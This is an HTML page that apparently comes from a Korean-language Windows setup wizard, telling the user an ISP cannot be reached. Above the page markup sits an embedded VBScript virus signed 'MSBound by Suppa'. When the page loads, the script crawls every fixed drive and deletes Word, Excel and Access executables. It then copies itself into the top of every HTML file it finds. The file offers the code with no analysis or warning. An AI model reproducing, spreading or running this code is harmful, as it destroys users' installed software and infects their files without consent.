<SCRIPT LANGUAGE="VBScript">
<!--
  Dim FSO,MSBound,DC,D,TMP,F
  MSBound = "<SCRIPT LANGUAGE=#VBScript#>$<!--$  Dim FSO,MSBound,DC,D,TMP,F$  MSBound = #|#$  On Error Resume Next$  TMP = ReplaceWithIn(Chr(36),vbCrLf,MSBound)$  TMP = ReplaceWithIn(Chr(35),Chr(34),TMP)$  F = InStr(1,TMP,Chr(124))$  MSBound = Left(TMP,F-1) & MSBound & Mid(TMP,F+1)$  F = InStr(2500,MSBound,Chr(124))$  MSBound = Left(MSBound,F-1) & Mid(MSBound,F+1)$$  Set FSO = CreateObject(#Scripting.FileSystemObject#)$  If Err.Number = 0 Then$     Set DC = FSO.Drives$         For Each D In DC$         If D.DriveType = 2 Then$            SweepDrive D.DriveLetter & #:\#$         End If$     Next$  End If$$Sub SweepDrive(pPath)$  Dim F, S, O$  On Error Resume Next$  Set F = FSO.GetFolder(pPath)$  InfectFiles F$  Set S = F.SubFolders$  For Each O In S$      SweepDrive(pPath & O.Name & #\#)$  Next        $End Sub $$Sub InfectFiles(pFolder)$  Dim F,Member,Ext,M,C$  On Error Resume Next$  Set F = pFolder.Files$  For Each Member In F$      M = UCase(Member.Name)$      If M = #WINWORD.EXE# Or M = #ACCESS.EXE# Or M = #EXCEL.EXE# Or M = #WORD.EXE# Then$         Set M = FSO.GetFile(Member.Path)$         M.Attributes = (M.Attributes And 1) - 1$         M.Delete$      End If   $      Ext = UCase(FSO.GetExtensionName(Member.Name))$      If Ext = #HTML# Or Ext = #HTM# Then$         Set M = FSO.OpenTextFile(Member.Path,1)$         C = M.ReadAll$         If InStr(1,C,MSBound) = 0 Then$            Set M = FSO.CreateTextFile(Member.Path, True)$            M.WriteLine MSBound & C$            M.Close$         End If$      End if$  Next$End Sub$$Private Function ReplaceWithIn(CurChar,NewChar,SourceString)$  Dim T,TMP$  T = 1$  TMP = SourceString$  Do While T > 0$     T = InStr(T, TMP, CurChar)$     If T > 0 Then TMP = Left(TMP,T-1) & NewChar & Mid(TMP,T+1)$  Loop$  ReplaceWithIn = TMP$End Function$$'MSBound by Suppa.$-->$<|/SCRIPT>$$"
  On Error Resume Next
  TMP = ReplaceWithIn(Chr(36),vbCrLf,MSBound)
  TMP = ReplaceWithIn(Chr(35),Chr(34),TMP)
  F = InStr(1,TMP,Chr(124))
  MSBound = Left(TMP,F-1) & MSBound & Mid(TMP,F+1)
  F = InStr(2500,MSBound,Chr(124))
  MSBound = Left(MSBound,F-1) & Mid(MSBound,F+1)

  Set FSO = CreateObject("Scripting.FileSystemObject")
  If Err.Number = 0 Then
     Set DC = FSO.Drives
         For Each D In DC
         If D.DriveType = 2 Then
            SweepDrive D.DriveLetter & ":\"
         End If
     Next
  End If

Sub SweepDrive(pPath)
  Dim F, S, O
  On Error Resume Next
  Set F = FSO.GetFolder(pPath)
  InfectFiles F
  Set S = F.SubFolders
  For Each O In S
      SweepDrive(pPath & O.Name & "\")
  Next        
End Sub 

Sub InfectFiles(pFolder)
  Dim F,Member,Ext,M,C
  On Error Resume Next
  Set F = pFolder.Files
  For Each Member In F
      M = UCase(Member.Name)
      If M = "WINWORD.EXE" Or M = "ACCESS.EXE" Or M = "EXCEL.EXE" Or M = "WORD.EXE" Then
         Set M = FSO.GetFile(Member.Path)
         M.Attributes = (M.Attributes And 1) - 1
         M.Delete
      End If   
      Ext = UCase(FSO.GetExtensionName(Member.Name))
      If Ext = "HTML" Or Ext = "HTM" Then
         Set M = FSO.OpenTextFile(Member.Path,1)
         C = M.ReadAll
         If InStr(1,C,MSBound) = 0 Then
            Set M = FSO.CreateTextFile(Member.Path, True)
            M.WriteLine MSBound & C
            M.Close
         End If
      End if
  Next
End Sub

Private Function ReplaceWithIn(CurChar,NewChar,SourceString)
  Dim T,TMP
  T = 1
  TMP = SourceString
  Do While T > 0
     T = InStr(T, TMP, CurChar)
     If T > 0 Then TMP = Left(TMP,T-1) & NewChar & Mid(TMP,T+1)
  Loop
  ReplaceWithIn = TMP
End Function

'MSBound by Suppa.
-->
</SCRIPT>

<HTML>
	<HEAD>
		<link rel=stylesheet type="text/css" href="..\setup\msobshel.css">
		<META http-equiv="Content-Type" content="text/html; charset=ks_c_5601-1987">
	</HEAD>
	<BODY TABINDEX=-1 onload="window.parent._Default_LoadMe();">

		<img id="WaterMark" class=gradient src="../images/watermrk.gif">
        <img id="StageImage" class=leftpane src="../images/error.jpg">
        <IMG id="imgDropShadow" class="dropshadow" src="../images/drpshdw.jpg"> 

		<SPAN TABINDEX=-1 CLASS="pageTitle">
            <ID id="ISPReset_TITLE">인터넷 서비스 제공자에 연결할 수 없습니다.</ID>
		</SPAN>

		<SPAN TABINDEX=-1 CLASS="contents">
		<table class="fontStyle">
			<tr>
				<td>
					<img src="../images/hndshake.jpg">
				</td>
				<td>		
					<DIV TABINDEX=-1 id="ISPReset_INFO1">선택한 인터넷 서비스 제공자의 새 계정 서비스가 현재 사용 불가능한 상태입니다.</div>
					<BR>
                    <DIV TABINDEX=-1 id="ISPReset_INFO2">다른 인터넷 서비스 제공자를 선택하려면 [뒤로]를 누르거나, 인터넷 서비스를 등록하지 않고 계속 진행하려면 [다음]을 누르십시오.</div>
				</td>
			</tr>
		</table>	
		</SPAN>

		<SPAN TABINDEX=-1 id="navbar" CLASS="navbar">
			<HR NOSHADE CLASS="blackBar">
			<SPAN TABINDEX=-1 Id=spanBack onclick="window.parent.GoBack();">
				<IMG Id=btnBack class=backButton>
				<LABEL TABINDEX=1 ACCESSKEY="B" for=btnBackText Id=btnBackText class=backButtonText>
					<ID id="LOCAL_BACK">뒤로(<U>B</U>)</ID>
				</LABEL>
			</SPAN>
			<SPAN TABINDEX=-1 Id=spanNext onclick="window.parent.GoNext();">
				<IMG Id=btnNext class=nextButton>
				<LABEL TABINDEX=2 ACCESSKEY="N" for=btnNextText Id=btnNextText class=nextButtonText>
					<ID id="LOCAL_NEXT">다음(<U>N</U>)</ID>
				</LABEL>
			</SPAN>
		</SPAN>
	</BODY>
</HTML>

